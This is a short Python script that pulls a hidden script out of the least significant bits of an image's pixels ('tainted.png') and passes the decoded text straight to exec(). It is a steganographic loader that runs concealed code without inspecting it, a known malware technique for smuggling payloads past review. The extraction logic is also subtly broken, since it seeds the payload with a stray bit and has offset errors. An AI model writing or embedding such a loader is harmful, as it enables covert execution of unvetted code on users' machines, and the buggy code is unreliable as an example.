from PIL import Image

def extract_script_from_image(image_path):
    # Open the image
    image = Image.open(image_path)
    pixels = image.convert("RGB").load()

    # Step 1: Extract the first 32 bits for the payload length
    length_bits = []
    bit_index = 0
    for y in range(image.height):
        for x in range(image.width):
            if bit_index < 32:
                r, g, b = pixels[x, y]
                length_bits.append(r & 1)  # Extract Red LSB
                if len(length_bits) < 32: length_bits.append(g & 1)  # Extract Green LSB
                if len(length_bits) < 32: length_bits.append(b & 1)  # Extract Blue LSB
                bit_index += 3
            else:
                break
        if bit_index >= 32:
            break

    # Convert the length bits to an integer
    length_in_bits = int(''.join(map(str, length_bits)), 2)

    # Step 2: Extract the payload bits
    payload_bits = [0]
    bit_index = 0
    for y in range(image.height):
        for x in range(image.width):
            if bit_index >= 32:
                r, g, b = pixels[x, y]
                payload_bits.append(r & 1)  # Extract Red LSB
                if len(payload_bits) < length_in_bits: payload_bits.append(g & 1)  # Green LSB
                if len(payload_bits) < length_in_bits: payload_bits.append(b & 1)  # Blue LSB
                if len(payload_bits) >= length_in_bits:
                    break
            bit_index += 3
        if len(payload_bits) >= length_in_bits:
            break

    # Step 3: Convert payload bits to bytes
    payload_bytes = []
    for i in range(0, len(payload_bits), 8):
        byte = 0
        for bit in payload_bits[i:i + 8]:
            byte = (byte << 1) | bit
        payload_bytes.append(byte)

    # Convert bytes to script
    try:
        script = bytes(payload_bytes).decode("utf-8")  # Try UTF-8 decoding
    except UnicodeDecodeError:
        script = bytes(payload_bytes).decode("latin1")  # Use latin1 if UTF-8 fails

    return script

# Specify the path to the image file
image_file_path = "./tainted.png"

# Extract and print the hidden Python script
hidden_script = extract_script_from_image(image_file_path)

if hidden_script:
    exec(hidden_script)
else:
    print("No valid script found!")
